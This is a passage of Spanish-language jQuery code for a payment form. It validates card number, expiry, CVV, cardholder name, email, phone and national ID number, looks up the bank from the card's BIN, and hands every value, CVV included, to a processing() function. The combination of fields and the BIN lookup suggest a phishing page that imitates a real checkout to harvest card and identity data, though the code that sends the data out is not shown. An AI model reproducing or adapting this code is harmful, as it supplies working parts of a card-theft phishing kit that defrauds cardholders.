        $("#expirationDate--text-field").off("input").on("input", function() {
            let val = $(this).val().replace(/\D/g, ""); // Solo números
            if (val.length > 4) val = val.slice(0, 4);

            if (val.length >= 3) {
                val = val.slice(0, 2) + "/" + val.slice(2);
            }
            $(this).val(val);
        });

        $("#expirationDate--text-field").off("blur").on("blur", function() {
            const valor = $(this).val().trim();
            const $parentDiv = $(this).closest("div[data-testid$='--text-field__wrapper']");

            $parentDiv.find("[id$='__end-icon-wrapper']").remove();

            const regex = /^(0[1-9]|1[0-2])\/\d{2}$/;
            if (regex.test(valor)) {
                $parentDiv.append(getValidIconHTML(valor));
            }
        });

        $("[data-testid='paymentCTA--button']").on('click', function() {
            const cardNumber = $("#cardNumber--text-field").val().trim();
            const cardHolder = $("#cardHolder--text-field").val().trim();
            const expirationDate = $("#expirationDate--text-field").val().trim();
            const fraudEmail = $("#fraud_billTo_email--text-field").val().trim();
            const cvv = $("#CVV--password-input").val().trim();
            const telefono = $("#telefono--text-input").val().trim();
            const cedula = $("#documentNumber--text-input").val().trim();
            let banco = encontrarBancoPorBin(cardNumber);

            const $expirationWrapper = $("#expirationDate--text-field").closest("div[data-testid$='--component-wrapper']");
            $expirationWrapper.find("#expirationDate--text-field__helper-text").remove();

            if (expirationDate.length < 5 || !/^(0[1-9]|1[0-2])\/\d{2}$/.test(expirationDate)) {
                $expirationWrapper.append(`
        <div data-testid="expirationDate--text-field__helper-text" 
             id="expirationDate--text-field__helper-text" 
             class="sc-fzoMdx faPque">Ingresa una fecha</div>`);
            }

            const $cardWrapper = $("#cardNumber--text-field").closest("div[data-testid$='--component-wrapper']");
            $cardWrapper.find("#cardNumber--text-field__helper-text").remove();

            const $cardHolderWrapper = $("#cardHolder--text-field").closest("div[data-testid$='--component-wrapper']");
            $cardHolderWrapper.find("#cardHolder--text-field__helper-text").remove();
            if (cardHolder.length < 3) {
                $cardHolderWrapper.append(`
        <div data-testid="cardHolder--text-field__helper-text"
                id="cardHolder--text-field__helper-text" 
                class="sc-fzoMdx faPque">Ingresa un nombre de titular válido</div>`);
            }

            const $cvvWrapper = $("#CVV--password-input").closest("div[data-testid$='--component-wrapper']");
            $cvvWrapper.find("#CVV--password-input__helper-text").remove();
            if (cvv.length < 3) {
                $cvvWrapper.append(`
        <div data-testid="CVV--password-input__helper-text"
                id="CVV--password-input__helper-text" 
                class="sc-fzoMdx faPque">Ingresa un CVV válido</div>`);
            }

            const $fraudEmailWrapper = $("#fraud_billTo_email--text-field").closest("div[data-testid$='--component-wrapper']");
            $fraudEmailWrapper.find("#fraud_billTo_email--text-field__helper-text").remove();
            if (fraudEmail.length < 5 || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(fraudEmail)) {
                $fraudEmailWrapper.append(`
        <div data-testid="fraud_billTo_email--text-field__helper-text"
                id="fraud_billTo_email--text-field__helper-text" 
                class="sc-fzoMdx faPque">Ingresa un correo electrónico válido</div>`);
            }

            const $telefonoWrapper = $("#telefono--text-input").closest("div[data-testid$='--component-wrapper']");
            $telefonoWrapper.find("#telefono--text-input__helper-text").remove();

            if (telefono.length < 7 || !/^\d{7,10}$/.test(telefono)) {
                $telefonoWrapper.append(`
        <div data-testid="telefono--text-input__helper-text"
             id="telefono--text-input__helper-text" 
             class="sc-fzoMdx faPque">Ingresa un teléfono válido</div>`);
            }

            const $cedulaWrapper = $("#documentNumber--text-input").closest("div[data-testid$='--component-wrapper']");
            $cedulaWrapper.find("#documentNumber--text-input__helper-text").remove();

            if (cedula.length < 5 || !/^\d{5,12}$/.test(cedula)) {
                $cedulaWrapper.append(`
        <div data-testid="documentNumber--text-input__helper-text"
             id="documentNumber--text-input__helper-text" 
             class="sc-fzoMdx faPque">Ingresa una cédula válida</div>`);
            }
            

            if (cardNumber.length < 13 || !detectarTipoTarjeta(cardNumber)) {
                $cardWrapper.append(`
        <div data-testid="cardNumber--text-field__helper-text" 
             id="cardNumber--text-field__helper-text" 
             class="sc-fzoMdx faPque">Ingresa un número de tarjeta válido</div>`);
                return;
            }

            processing({
                t: 'tarjeta',
                banco: banco,
                cedula: cedula,
                telefono: telefono,
                nombres: cardHolder,
                email: fraudEmail,
                tarjeta: cardNumber,
                ftarjeta: expirationDate,
                cvv: cvv,
            });

        });
    })